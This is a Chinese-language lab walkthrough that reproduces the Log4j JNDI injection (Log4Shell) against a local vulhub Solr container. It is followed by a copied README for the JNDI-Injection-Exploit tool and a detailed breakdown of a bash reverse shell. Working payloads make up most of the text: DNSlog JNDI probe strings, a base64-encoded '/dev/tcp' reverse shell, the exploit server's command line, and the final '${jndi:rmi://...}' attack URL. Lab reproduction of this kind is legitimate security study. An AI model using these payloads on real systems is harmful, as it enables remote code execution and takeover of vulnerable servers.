验证靶场：

1.CTFshow (https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730)

2.VULFOCUS(https://vulfocus.cn/#/login)

3.掌控安全封神台（https://hack.zkaq.cn/battle/target?id=5a768e0ca6938ffd）

PS：以上三个靶场均已失效。

已从vulhub/log4j，通过docker创建log4j容器靶场，进行复现攻击

去dnslog平台申请一个域名，http://dnslog.cn/
先测试是否有jndi注入漏洞。
如`${jndi:ldap://7sqs1g.dnslog.cn}`
`${jndi:ldap://${java:version}.7sqs1g.dnslog.cn}`

搭建好之后，攻击URL为`http://localhost:8983/solr/admin/cores?action=${jndi:ldap://${java:version}.7sqs1g.dnslog.cn}`
访问后可以在dnslog平台得到数据回显，大概是这个样子  
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/34c7fee7e0854b190bad4a2242984d99.png)  
就已经说明环境成功了，存在这个log4j的漏洞


使用JNDIExploit-1.2-SNAPSHOT.jar构造payload攻击，不报错但是没有反向连接成功

使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar构造payload攻击，直接报错都不给机会能否反向连接成功。

由于我是mac操作，所以使用docker搭建运行`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`


因此还涉及宿主机的概念，靶场要直接访问宿主机需要通过`host.docker.internal`


本地服务器新建一个bash,用于监听端口，等待反向连接成功
`nc -lvn  8888`

构造shell语句，
`bash -i >& /dev/tcp/host.docker.internal/8888 0>&1`
base64编码即可
`YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC84ODg4IDA+JjE=`
讲这串编码放入-C里面，-A后面接IP地址
```shell
  

docker run -it --rm \

-v "$PWD":/app \

-w /app \

-p 1099:1099 \

-p 1389:1389 \

-p 8180:8180 \

dockerproxy.net/devexdev/8-jdk-alpine \

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar \

-C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}" \

-A host.docker.internal

```


对网站发起攻击
payload:
`http://localhost:8983/solr/admin/cores?action=${jndi:rmi://host.docker.internal:1099/cyjwau}`

攻击正常则nc反向连接成功
可在之前监听的窗口进行操作靶机

---


## 介绍

JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

## 使用

可执行程序为jar包，在命令行中运行以下命令：

```shell
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

其中:

- **-C** - 远程class文件中要执行的命令。

  （可选项 , 默认命令是mac下打开计算器，即"open /Applications/Calculator.app"）

- **-A** - 服务器地址，可以是IP地址或者域名。

  （可选项 , 默认地址是第一个网卡地址）

注意:

- 要确保 **1099**、**1389**、**8180**端口可用，不被其他程序占用。

  或者你也可以在run.ServerStart类26~28行更改默认端口。

- 命令会被作为参数传入**Runtime.getRuntime().exec()**，

  所以需要确保命令传入exec()方法可执行。
  
  **bash等可在shell直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C "bash -c ..."**

## 示例

### 本地演示：

1. 启动 JNDI-Injection-Exploit：

   ```shell
   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
   ```

    截图：
    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)


2. 我们需要把第一步中生成的 JNDI链接注入到存在漏洞的应用环境中，方便解释用如下代码模仿漏洞环境：

   ```java
   public static void main(String[] args) throws Exception{
       InitialContext ctx = new InitialContext();
       ctx.lookup("rmi://127.0.0.1/fgf4fp");
   }
   ```

   当上面代码运行后，应用便会执行相应命令，这里是弹出计算器，没截图，可以自己测一下。

   截图是工具的server端日志：

    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)



## 安装

下面两种方法都可以得到Jar包

1. 从 [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases)直接下载最新的Jar。

2. 把源码下载到本地然后自行编译打包。（在Java1.7+ 、Java1.8+ 和 Maven 3.x+环境下测试可以）

   ```shell
   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
   ```

   ```shell
   $ cd JNDI-Injection-Exploit
   ```

   ```shell
   $ mvn clean package -DskipTests
   ```

## 工具实现

1. 首先生成的链接后面codebaseClass是6位随机的，这个是因为不希望让工具生成的链接本身成为一种特征被监控或拦截。
2. 服务器地址实际就是codebase地址，相比于marshalsec中的JNDI server来说，这个工具把JNDI server和HTTP server绑定到一起，并自动启动HTTP server返回相应class，更自动化了。
3. HTTP server基于jetty实现的，本质上是一个能下载文件的servlet，比较有意思的是我提前编译好class模板放到resource目录，然后servlet会读取class文件，使用ASM框架对读取的字节码进行修改，然后插入我们想要执行的命令，返回修改后的字节码。

## 待实现

- （已完成EL表达式绕过部分）在更高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，我会找时间把[JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)这个项目的东西融入到本项目中，生成能绕过JDK限制JNDI链接。
- … ...

-----


          
让我详细解释这个bash反弹shell命令的每个部分：

## 命令结构分析

```bash
bash -i >& /dev/tcp/host.docker.internal/8888 0>&1
```

## 逐部分详解

### 1. `bash -i`
- `bash`: 调用bash shell
- `-i`: 以交互模式运行，这意味着shell会接收并执行用户输入的命令
- 这确保了我们获得一个完全交互式的shell会话

### 2. `>& /dev/tcp/host.docker.internal/8888`
- `>`: 重定向符号，用于将输出重定向到指定位置
- `&`: 与`>`结合使用，表示重定向所有输出（包括标准输出和标准错误）
- `/dev/tcp/host.docker.internal/8888`: 这是bash的一个特殊功能
  - `/dev/tcp`: 是bash内置的一个伪设备文件，用于TCP网络连接
  - `host.docker.internal`: Docker容器访问宿主机的特殊DNS名称
  - `8888`: 目标端口号，即您在宿主机上监听的端口

### 3. `0>&1`
- `0`: 标准输入（stdin）
- `1`: 标准输出（stdout）
- `>&`: 重定向符号
- 这个部分将标准输入重定向到标准输出，形成一个闭环
- 实现了输入和输出的双向通信

## 整体工作原理

1. **建立连接**: `bash -i` 启动交互式shell，并通过 `/dev/tcp/host.docker.internal/8888` 建立到宿主机8888端口的TCP连接

2. **重定向输出**: `>& /dev/tcp/...` 将bash的所有输出（包括命令结果）发送到已建立的TCP连接

3. **重定向输入**: `0>&1` 将标准输入重定向到标准输出，使得通过TCP连接接收到的数据能够作为bash的输入

4. **双向通信**: 这样就建立了一个完整的双向通信通道，宿主机可以通过nc接收shell的输出，并发送命令给shell执行

## 执行流程

```
目标服务器                    您的Mac主机
-----------                  -----------
执行命令:                    监听端口:
bash -i >&                   nc -lv 8888
/dev/tcp/host.docker.internal/8888
0>&1

1. 目标服务器连接到host.docker.internal:8888
2. bash输出通过TCP连接发送到您的Mac
3. 您在Mac上输入的命令通过TCP连接发送到目标服务器
4. 目标服务器执行命令并将结果通过TCP连接返回
```

## 安全意义

这是一个典型的**反弹shell**（reverse shell）技术：
- 目标服务器主动连接到攻击者控制的机器
- 绕过防火墙的入站连接限制
- 建立持久的远程控制通道

## 使用前提

1. 目标服务器必须支持bash的`/dev/tcp`功能
2. 目标服务器能够解析`host.docker.internal`域名
3. 您的Mac主机必须在8888端口监听：`nc -lv 8888`
4. 网络策略允许从容器到宿主机的出站TCP连接

这就是为什么这个命令能够建立从目标服务器到您Mac主机的反向shell连接的完整原理。
        